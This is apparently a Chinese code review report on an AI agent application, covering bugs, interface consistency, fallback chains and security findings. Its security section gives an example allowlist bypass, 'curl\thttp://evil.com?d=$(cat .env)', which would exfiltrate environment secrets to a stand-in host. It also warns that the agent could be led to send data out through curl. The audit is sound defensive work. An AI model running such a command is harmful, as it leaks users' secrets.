# 自由鸟 v4 全栈代码审查报告

> 审查日期: 2026-06-03
> 审查范围: 全部 18 个源文件
> 审查者: 全栈审查专家

---

## 总体评分

| 维度 | 评分 | 说明 |
|------|------|------|
| 架构设计 | ⭐⭐⭐⭐ | 三层降级、多Agent、SSE流清晰合理 |
| 安全性 | ⭐⭐⭐ | 路径沙箱和执行白名单较好，有若干可改进点 |
| 代码质量 | ⭐⭐⭐⭐ | 整体清晰，存在少量代码重复 |
| 降级链路 | ⭐⭐⭐⭐⭐ | 搜索6层/记忆3层降级完整 |
| 接口一致性 | ⭐⭐⭐⭐ | 核心接口一致，有1处行为差异 |

---

## 一、致命Bug

### 🔴 1. app.js:276-279 — messages截断造成system消息重复

```javascript
// app.js line 275-279
if (messages.length > 50) {
    const systemMsg = messages[0]
    messages.splice(1, messages.length - 50)   // 删除超出部分
    messages.unshift(systemMsg)                 // 重复添加system
}
```

**问题**: `splice(1, ...)` 从索引1开始删除，索引0的system消息不受影响。之后 `unshift(systemMsg)` 又在最前面插入一份拷贝。结果 messages[0] 和 messages[1] 都是 system 提示词。

**影响**: 每次截断后，system prompt占用双份token，浪费约1500 tokens/轮。累计影响大。

**修复建议**: 改为 `messages[0] = systemMsg` 或直接移除 `unshift` 行。

### 🔴 2. memory-chromadb.js:11 — Python路径硬编码

```javascript
const PYTHON = 'C:/Users/song/.workbuddy/binaries/python/versions/3.13.12/python.exe'
```

**问题**: 这只能在开发者的机器上运行。任何其他机器都会崩溃，且没有 fallback 机制——`startChromaDB()` 直接 spawn 这个路径。

**影响**: 部署到其他机器时 ChromaDB 无法启动，降级到 SQLite 可用但丧失了语义搜索能力。

**修复建议**: 改为 `process.env.PYTHON_PATH || 'python'`，或者通过环境变量/自动检测多个常见路径。

### 🔴 3. memory-chromadb.js:228-243 — reflect 双写无去重，ChromaDB 无限增长

```javascript
async function reflect(category, lesson) {
    const sqlite = require('./memory-db')
    const result = await sqlite.reflect(category, lesson)
    
    if (_dbReady && result.success) {
        // 每次都直接新增，不检查是否重复
        const id = `lesson_${Date.now()}`
        await chromaAPI('POST', `/api/v2/collections/${colId}/add`, {
            ids: [id],
            documents: [lesson],
            metadatas: [{ category, access_count: 0 }],
        })
    }
    return result
}
```

**问题**: 虽然查询了 `existing`（第231行），但结果完全未使用。每次 reflect 调用都会在 ChromaDB 中新增一条完全相同的记录。SQLite 有 UNIQUE 约束保护但 ChromaDB 没有。

**影响**: ChromaDB 数据量随时间线性增长，重复的向量搜索降低精度。

**修复建议**: 在写入前用相似度阈值检查是否存在相似记录（cosine similarity > 0.95 则跳过）。

---

## 二、接口一致性

### 检查对象: memory.js(桥接层) → memory-chromadb.js(Phase3) → memory-db.js(Phase2)

#### 导出函数对比

| 函数 | memory.js | memory-chromadb.js | memory-db.js | app.js消费 |
|------|-----------|-------------------|--------------|-----------|
| loadMemory | ✅ 委托chroma | ✅ 委托sqlite | ✅ SQLite | ✅ |
| loadLessons | ✅ 委托chroma | ✅ ChromaDB+降级 | ✅ SQLite+混合 | ✅ |
| saveMemory | ✅ 委托chroma | ✅ 委托sqlite | ✅ SQLite+文件 | ✅ |
| searchMemory | ✅ 委托chroma | ✅ 委托sqlite | ✅ SQLite LIKE | ✅ |
| reflect | ✅ 委托chroma | ✅ 双写 | ✅ SQLite+文件 | ✅ |
| archiveOldLogs | ✅ 委托chroma | ✅ 委托sqlite | ✅ 文件操作 | ❌ 未消费 |
| getTodayLog | ✅ 自有实现 | ❌ 不存在 | ❌ 不存在 | ❌ 未消费* |

*`getTodayLog` 未被 app.js、tool-registry.js、expert-router.js 中的任何导入使用。只存在于 memory.js 导出中。

**结论**: 所有被消费的接口完全一致，`getTodayLog` 和 `archiveOldLogs` 是多余的内部导出。

### ⚠️ 行为差异: loadLessons 全量返回数量不一致

| 引擎 | query为空时的行为 |
|------|------------------|
| memory-db.js | 返回**全部**教训（按类别分组） |
| memory-chromadb.js | 每类只返回**前5条** (`lessons.slice(0, 5)`) |

当 ChromaDB 可用时，全量查询（`/memory` 端点）会丢失大量数据。这不是接口签名问题，是行为不一致。

**修复建议**: memory-chromadb.js 的全量返回也应返回全部数据，或统一两者行为。

---

## 三、降级链路完整性

### 3.1 搜索降级链 ✅ 完整

```
basic模式: Claw Search → Serper(Google) → Tavily → DuckDuckGo → ContextWire
deep模式: Tavily Deep → (fallback basic链)
```

- 每层都有 `.catch(() => [])` 保护
- 缓存机制（basic模式1小时TTL）
- 查询脱敏检查（敏感模式拦截）
- **评级: ⭐⭐⭐⭐⭐ 完善**

### 3.2 记忆降级链 ✅ 完整

```
ChromaDB(向量搜索) → SQLite+embedding(语义搜索) → SQLite关键词(纯文本匹配)
```

- memory-chromadb.js: `initChroma` catch 块设置 `_dbReady = false`，后续 loadLessons 自动走 SQLite
- memory-db.js: `getEmbedder` 不可用时走纯关键词+访问计数
- memory.js 桥接层透明路由

**评级: ⭐⭐⭐⭐⭐ 完善**

### 3.3 小问题

1. **memory-chromadb.js 初始化时序**: `setTimeout(initChroma, 2000)` 使用固定延迟而非轮询就绪状态。如果 Python 启动慢（冷启动可能超过15秒），ChromaDB 可能被误判为不可用，但其实稍后就会就绪。
2. **ChromaDB 进程没有健康检查/重连**: 如果 chroma 进程意外退出，`_dbReady` 仍为 `true`，后续调用会报错（这时 catch 会降级到 SQLite），但进程不会自动重启。

---

## 四、代码质量

### 4.1 代码重复

#### 🟡 重复1: 脱敏逻辑 (app.js vs expert-router.js)

| 文件 | 函数 | 模式数量 |
|------|------|---------|
| app.js | sanitizeText() | 8种 |
| expert-router.js | sanitizeOutput() | 7种 |

差异: app.js 多了 `DEEPSEEK|OPENAI|TAVILY|CONTEXTWIRE|SERPER_API_KEY` 的环境变量匹配，expert-router.js 缺少这个。

**风险**: 如果专家输出包含环境变量名，不会在 expert-router 中被脱敏。
**修复建议**: 抽象为共享工具函数 `tools/sanitize.js`。

#### 🟡 重复2: Tavily 客户端初始化 (mcp-client.js 4处)

`tavilySearch`、`tavilyDeepSearch`、`extractURL`、`research` 四个函数中都有相同的初始化代码（~8行）：

```javascript
const tavilyMod = await getTavilyMod()
if (!tavilyMod) return []
const Tavily = tavilyMod.default || tavilyMod.Tavily || tavilyMod.tavily
if (!Tavily) return []
const client = typeof Tavily === 'function' ? new Tavily({ apiKey: TAVILY_KEY }) : Tavily({ apiKey: TAVILY_KEY })
```

**修复建议**: 抽象为 `getTavilyClient()` 返回客户端或 null。

#### 🟡 重复3: getMemoryDesc (app.js vs expert-router.js)

两个文件各有一个，逻辑类似但不完全相同:
- app.js: 传入 `userMessage` 给 `loadLessons` 做关键词匹配
- expert-router.js: 不传入参数，获取全量教训

**修复建议**: 统一为一个函数，导出到共享模块。

### 4.2 未使用变量/死代码

| 文件 | 行号 | 问题 |
|------|------|------|
| memory-chromadb.js | 231 | `existing` 查询结果赋值后从未使用 |
| find.js | 13 | `sanitized` 变量在 pattern 通过安全检查后等于原值，是多余操作 |
| tool-registry.js | 42 | `\|\| EXPERT_TOOLS.architect \|\| []` 的 `\|\| []` 是死代码（architect 是数组永远 truthy） |

### 4.3 console.log 遗留

审查确认无调试残留。所有 console.log/error/warn 调用都是合理的启动/错误/状态日志。

### 4.4 其他代码问题

- **mcp-client.js**: `trimCache()` 每次只删除1个条目，在高速写入场景下可能来不及清理
- **find.js 命令注入**: `dir /s /b "${dir}\\${sanitized}" 2>nul` 中 sanitized 虽然已清理危险字符，但 `${dir}\\${sanitized}` 如果 `dir` 中包含特殊字符仍可能出问题
- **exec.js**: `command.startsWith(p + ' ')` 未处理 `\t` 制表符分隔的情况。攻击者可用 `curl\thttp://evil.com` 绕过白名单

---

## 五、安全漏洞

### 🔴 严重

#### SEC-1: exec.js 命令白名单可被制表符绕过

```javascript
// exec.js line 16
const SHELL_BLOCKED = /[|;&`$(){}]/.test(command.replace(/\/\/.*$/,''))
```

**问题**:
1. `startsWith(p + ' ')` 只检查后跟空格，不检查制表符 `\t`
2. `replace(/\/\/.*$/,'')` 处理的是 JS 注释而非 shell，在 shell 上下文中无用
3. `curl` 和 `wget` 在白名单中，AI 可被诱导向外部服务器发送数据

**攻击向量**: 构造 `curl\thttp://evil.com?d=$(cat .env)` — 如果终端将 `\t` 解析为空格分隔符，则绕过白名单前缀检查。

**修复建议**:
- 将 `curl` 和 `wget` 从白名单移除，或添加子命令白名单（仅允许 GET 请求已知域名）
- 使用 shell-parse 库正确解析命令
- 添加 `\t` 到分隔符检查

#### SEC-2: 前端硬编码 API_TOKEN

```javascript
// public/index.html line 140
const API_TOKEN = 'ziyouniao-local'
```

**问题**: 任何人查看页面源码或通过浏览器开发者工具都可以获取这个 token。虽然默认绑定 `0.0.0.0` 表示局域网可访问，如果部署到公网则无安全防护。

**修复建议**:
1. 启动时不依赖前端 token，改为依赖 Electron IPC 或 session cookie
2. 或在前端通过 `/api/config` 在首次认证后获取一次性 session token

#### SEC-3: read.js 未处理 `~user/` 语法

```javascript
// read.js line 12
const resolved = path.resolve(homedir, filepath.replace(/^~/, ''))
```

**问题**: 只处理了 `~` 开头，未处理 `~username/` 这种 Unix 用户目录跳转。在 Windows 上 `path.resolve` 可能不会正确解析。

**严重性**: 低（Windows 环境）到中（Unix 环境）。

### 🟡 中等

#### SEC-4: expert-router 中间工具结果未经脱敏返回

专家调用链路中，tool_calls 的中间结果直接返回给 DeepSeek API，未经过 `sanitizeOutput()`。如果文件内容或命令输出包含 API Key，这些会发送到 DeepSeek 服务器。

**修复建议**: 在 `safeHandler` 中对返回值做脱敏处理。

#### SEC-5: ChromaDB 无认证

```javascript
const CHROMA_URL = `http://127.0.0.1:${CHROMA_PORT}`
```

**问题**: ChromaDB REST API 无任何认证，同机器任何进程可读写。如果其他服务被攻破，可轻易访问所有记忆数据。

**严重性**: 低（仅绑定 localhost）。但如果将来改为远程 ChromaDB 需要加认证。

### 🟢 低风险/建议

#### SEC-6: Content-Security-Policy 使用 'unsafe-inline'

```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

允许内联脚本降低了 XSS 防护。考虑到当前前端 JS 全部内联，这是必要的权衡。建议后续迁移到外部 JS 文件并启用 nonce/hash。

#### SEC-7: 速率限制基于 IP 可能被代理绕过

`req.ip` 在 `trust proxy` 未设置时取的是直连 IP。如果前面有 nginx 反向代理，所有请求都是同一个 IP。

**修复建议**: 如果使用反向代理，设置 `app.set('trust proxy', 1)`。

---

## 六、Electron 桌面

### electron-main.js 审查

- ✅ `nodeIntegration: false` + `contextIsolation: true` — 安全的默认值
- ✅ `setWindowOpenHandler` 拦截外部链接用系统浏览器打开
- ✅ 子进程 fork 方式启动 Express，生命周期管理正确
- ⚠️ `startServer` 的 3 秒 fallback 是硬编码（line 18），在慢机器上可能不够
- ⚠️ `serverProcess.kill()` 发送的是默认 SIGTERM，没有等待优雅关闭

---

## 七、pm2 配置

### ecosystem.config.js 审查

- ✅ 基础配置完整：autorestart, restart_delay, max_restarts
- ⚠️ `cwd: 'F:/ziyouniao'` 硬编码绝对路径，不便于部署到其他目录
- ⚠️ 日志文件相对路径 `./logs/`，依赖 cwd 设置，如 cwd 不存在则日志丢失
- ❌ 缺少 `max_memory_restart` 限制，长时间运行可能内存泄漏

建议:
```javascript
cwd: __dirname,  // 改为相对于配置文件的路径
max_memory_restart: '500M',
```

---

## 八、改进优先级总结

| 优先级 | 编号 | 问题 | 影响 | 文件 |
|--------|------|------|------|------|
| 🔴 P0 | Bug-1 | messages截断重复system提示词 | 每次截断浪费~1500 tokens | app.js:276 |
| 🔴 P0 | Bug-2 | Python路径硬编码 | 非开发者机器ChromaDB不可用 | memory-chromadb.js:11 |
| 🔴 P0 | SEC-1 | exec命令白名单制表符绕过 | 潜在命令注入 | exec.js:16 |
| 🔴 P0 | SEC-2 | 前端硬编码API_TOKEN | 公网部署时无防护 | index.html:140 |
| 🟡 P1 | Bug-3 | reflect双写ChromaDB无去重 | 数据无限重复增长 | memory-chromadb.js:231 |
| 🟡 P1 | 行为差异 | loadLessons全量返回数量不一致 | 前端/专家看到的数据不一致 | memory-chromadb.js:177 |
| 🟡 P1 | 代码重复 | Tavily客户端初始化重复4次 | 维护成本 | mcp-client.js |
| 🟡 P1 | 代码重复 | 脱敏函数两份 | expert-router可能漏脱敏 | app.js+expert-router.js |
| 🟡 P1 | SEC-4 | 专家中间结果未脱敏 | 敏感信息可能泄漏给DeepSeek | expert-router.js:84 |
| 🟢 P2 | 死代码 | find.js多余sanitize | 无实际影响 | find.js:13 |
| 🟢 P2 | 硬编码 | ecosystem cwd绝对路径 | 不便于部署 | ecosystem.config.js:5 |
| 🟢 P2 | 缺少限制 | pm2缺少max_memory_restart | 潜在内存泄漏 | ecosystem.config.js |
| 🟢 P2 | ChromaDB | 无健康检查/重连 | 进程崩溃后需重启 | memory-chromadb.js |

---

## 九、架构总评

**亮点**:
1. 三层降级设计（搜索6层 + 记忆3层）是教科书级别的容错架构
2. 路径安全采用 `realpath` 解析 + homedir 约束，防路径穿越设计到位
3. 输出脱敏覆盖了多种 API Key 格式，考虑周全
4. 确认保护（`__confirmed`）机制防止危险工具误调用
5. 安全规则注入 system prompt，多层级防护

**核心风险**:
1. 命令执行白名单可被绕过（制表符）
2. 默认 API_TOKEN 太弱且前端暴露
3. 两条截断 bug 虽不致命但持续浪费资源

**总体评价**: 项目架构设计成熟度很高，降级链路模型值得学习。主要问题集中在安全边界的几个检查不够严格，以及开发环境配置残留。修复 P0 问题后即可投入生产使用。
